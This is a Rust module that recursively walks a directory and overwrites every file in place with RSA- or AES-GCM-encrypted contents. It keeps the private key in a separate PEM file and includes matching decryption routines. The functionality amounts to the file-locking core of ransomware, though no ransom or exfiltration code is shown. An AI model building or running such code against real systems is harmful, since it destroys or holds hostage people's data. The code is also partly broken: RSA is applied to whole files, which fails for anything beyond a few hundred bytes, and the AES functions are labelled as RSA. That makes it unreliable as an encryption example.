pub mod cyp {
    use std::io;
    use std::fs::{self, DirEntry};
    use std::path::Path;
    use rsa::{RsaPrivateKey, RsaPublicKey, Pkcs1v15Encrypt, 
        pkcs8::DecodePrivateKey, pkcs8::EncodePrivateKey };
    use rand::rngs::{ThreadRng};
    use aes_gcm::aead::{Aead, KeyInit, OsRng};
    use aes_gcm::{Nonce,Aes256Gcm, AeadCore};
    use aes_gcm::aead::generic_array::typenum::U12;

    pub struct Cypher {
        priv_key:RsaPrivateKey,
        pub_key:RsaPublicKey,
        rng: ThreadRng,
    }
    pub struct Aescypher {
        nonce:Nonce<U12>,
        cipher:Aes256Gcm,
    }
    impl Aescypher {
        pub fn new() -> Self {
            let aes_key = Aes256Gcm::generate_key(OsRng);
            // Generate a random nonce for AES
            let nonce = Aes256Gcm::generate_nonce(OsRng);
            // Encrypt the plaintext with AES
            let cipher = Aes256Gcm::new(&aes_key);
            return Aescypher { nonce, cipher };
        }
    }

    // @brief generates the single key we need
    pub fn rsa_head() -> Cypher {
        let mut rng = rand::thread_rng();

        let bits = 2048;
        let priv_key = RsaPrivateKey::new(&mut rng, bits)
            .expect("failed to generate a key");
        let pub_key = RsaPublicKey::from(&priv_key);

        return Cypher { priv_key, pub_key, rng };
    }

    // @brief performs a RSA decypher of the file
    pub fn rsa_dec(file:&DirEntry, cyp:&mut Cypher) 
        -> io::Result<()> {
            let enc_data = fs::read(file.path())?;
            let dec_data = cyp.priv_key.decrypt(Pkcs1v15Encrypt, &enc_data)
                .expect("failed to decrypt");
            fs::write(file.path(), dec_data)?;
            println!("decyphered {:?}", file.file_name());
            Ok(())
        }

    // @brief performs a RSA cypher of the file
    pub fn rsa_enc(file:&DirEntry, cyp:&mut Cypher) 
        -> io::Result<()> {
            let data = fs::read(file.path())?;
            let enc_data = cyp.pub_key
                .encrypt(&mut cyp.rng, Pkcs1v15Encrypt, &data[..])
                .expect("failed to encrypt");
            fs::write(file.path(), enc_data)?;
            println!("cyphered {:?}", file.file_name());
            Ok(())
        }

    // @brief Saves the private key into a file
    pub fn save_priv_key(cyp:Cypher, filename:&str) -> Result<(),
       Box<dyn std::error::Error>> {
           let pem = cyp.priv_key.to_pkcs8_pem(Default::default())?;
           fs::write(filename, pem)?;
           Ok(())
       }

    // @brief Retreive a Cypher struct from a file
    pub fn get_cypher(filename:&str) -> Result<Cypher, Box<dyn std::error::Error>> {
        let pem = fs::read_to_string(filename)?;
        let priv_key = RsaPrivateKey::from_pkcs8_pem(&pem)?;
        let pub_key = RsaPublicKey::from(&priv_key);
        let rng = rand::thread_rng();
        Ok(Cypher {priv_key, pub_key, rng})
    }

    // @brief Iterates over the files in the directory and applies the fun
    pub fn cyp_dirs(dir: &Path,
            fun: fn(file:&DirEntry, cyp:&mut Cypher) -> io::Result<()>,
            cyp:&mut Cypher) -> io::Result<()> {
        if dir.is_dir()  {
            for entry in fs::read_dir(dir)? {
                let entry = entry?;
                let path = entry.path();
                if path.is_dir() {
                    let _ = cyp_dirs(&path, fun, cyp);
                }
                else
                {
                    let _ = fun(&entry, cyp);
                }
            }
        }
        Ok(())
    }
    // @brief performs a RSA decypher of the file
    pub fn aes_dec(file:&DirEntry, cyp:& Aescypher) 
        -> io::Result<()> {
            let enc_data = fs::read(file.path())?;
            let dec_data = cyp.cipher.decrypt(&cyp.nonce, enc_data.as_ref())
            .expect("Decryption failure");
            fs::write(file.path(), dec_data)?;
            println!("decyphered {:?}", file.file_name());
            Ok(())
        }

    // @brief performs a RSA cypher of the file
    pub fn aes_enc(file:&DirEntry, cyp: &Aescypher) 
        -> io::Result<()> {
            
            let data = fs::read(file.path())?;
            let enc_data = cyp.cipher.encrypt(&cyp.nonce, data.as_ref())
            .expect("Encryption failure");
            fs::write(file.path(), enc_data)?;
            println!("cyphered {:?}", file.file_name());
            Ok(())
        }

}
